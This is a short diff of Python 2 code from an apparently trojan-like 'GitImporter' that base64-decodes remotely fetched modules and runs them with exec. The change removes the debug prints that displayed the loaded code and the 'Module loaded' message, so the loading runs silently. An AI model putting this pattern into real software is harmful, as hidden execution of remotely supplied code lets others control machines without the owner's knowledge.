@@ -65,9 +65,6 @@ class GitImporter(object):
 
 			if new_library is not None:
 				current_module_code=base64.b64decode(new_library)
-				print
-				print current_module_code
-				print
 				return self
 		return None
 
@@ -75,7 +72,6 @@ class GitImporter(object):
 		module=imp.new_module(name)
 		exec self.current_module_code in module.__dict__
 		sys.modules[name]=module
-		print "[*] Module %s loaded" % name
 		return module
 		
 def module_runner(module):
